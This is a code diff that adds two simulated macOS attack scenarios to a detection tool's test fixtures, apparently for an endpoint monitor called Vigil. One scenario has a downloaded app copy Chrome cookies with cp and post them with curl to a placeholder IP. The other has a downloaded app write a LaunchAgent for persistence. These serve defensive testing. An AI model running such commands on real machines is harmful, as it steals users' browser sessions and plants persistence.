@@ -429,6 +429,97 @@ export const ATTACKS: AttackScenario[] = [
     ],
   },
   {
+    id: 'download-collect-then-send',
+    name: 'Unsigned download copies browser cookies with cp, then curl sends them',
+    mimics: 'Atomic/Poseidon-style stealers that use built-in tools',
+    tactic: 'collection',
+    variant: 'canonical',
+    expect: ['untrusted-download-collect-then-connect'],
+    note: 'cp and curl are Apple tools, so only the download they came from makes this suspicious.',
+    events: (at) => {
+      const origin = 'https://games.example/free-game.dmg';
+      const game = p('/Volumes/Free Game/Free Game.app/Contents/MacOS/Free Game', {
+        pid: 51_000,
+        ppid: 1,
+        signing: 'adhoc',
+        sha256: fakeHash('free-game'),
+        parentPath: '/sbin/launchd',
+        quarantine: { originUrl: origin, agent: 'Safari' },
+      });
+      // What Vigil's process tree adds to the children (ideal telemetry).
+      const from = { path: game.path, originUrl: origin, signing: 'adhoc' as const };
+      const shell = p('/bin/sh', {
+        pid: 51_001,
+        ppid: 51_000,
+        signing: 'apple',
+        args: ['sh', '-c', 'cp "$C" /tmp/.c && curl -s -X POST --data-binary @/tmp/.c $U'],
+        parentPath: game.path,
+        downloadedAncestor: from,
+      });
+      const cp = p('/bin/cp', {
+        pid: 51_002,
+        ppid: 51_001,
+        signing: 'apple',
+        args: ['cp', `${CHROME}/Cookies`, '/tmp/.c'],
+        parentPath: '/bin/sh',
+        downloadedAncestor: from,
+      });
+      const curl = p('/usr/bin/curl', {
+        pid: 51_003,
+        ppid: 51_001,
+        signing: 'apple',
+        args: ['curl', '-s', '-X', 'POST', '--data-binary', '@/tmp/.c', 'https://198.51.100.23/u'],
+        parentPath: '/bin/sh',
+        downloadedAncestor: from,
+      });
+      return [
+        exec(at, game),
+        exec(at + 200, shell),
+        exec(at + 300, cp),
+        file(at + 310, 'open', `${CHROME}/Cookies`, cp),
+        exec(at + 600, curl),
+        connect(at + 900, '198.51.100.23', curl),
+      ];
+    },
+  },
+  {
+    id: 'download-adds-launch-agent',
+    name: 'Unsigned download installs a launch agent through a shell',
+    mimics: 'Droppers that persist with a LaunchAgent written by sh',
+    tactic: 'persistence',
+    variant: 'canonical',
+    expect: ['untrusted-download-persistence'],
+    events: (at) => {
+      const origin = 'https://cdn.example/VideoPlayer.dmg';
+      const app = p('/Volumes/Player/Player.app/Contents/MacOS/Player', {
+        pid: 52_000,
+        ppid: 1,
+        signing: 'unsigned',
+        sha256: fakeHash('player'),
+        parentPath: '/sbin/launchd',
+        quarantine: { originUrl: origin },
+      });
+      const shell = p('/bin/sh', {
+        pid: 52_001,
+        ppid: 52_000,
+        signing: 'apple',
+        args: ['sh', '-c', 'cp helper.plist ~/Library/LaunchAgents/'],
+        parentPath: app.path,
+        downloadedAncestor: { path: app.path, originUrl: origin, signing: 'unsigned' },
+      });
+      const plist = `${HOME}/Library/LaunchAgents/com.player.helper.plist`;
+      return [
+        exec(at, app),
+        exec(at + 200, shell),
+        {
+          ...launchAgent(at + 400, plist, `${HOME}/Library/Application Support/Player/helper`),
+          source: 'santa' as const,
+          process: shell,
+        },
+      ];
+    },
+  },
+  {
     id: 'shared-temp-exec',
     name: 'New unsigned program in /Users/Shared',
     mimics: 'Second stages dropped in shared folders',
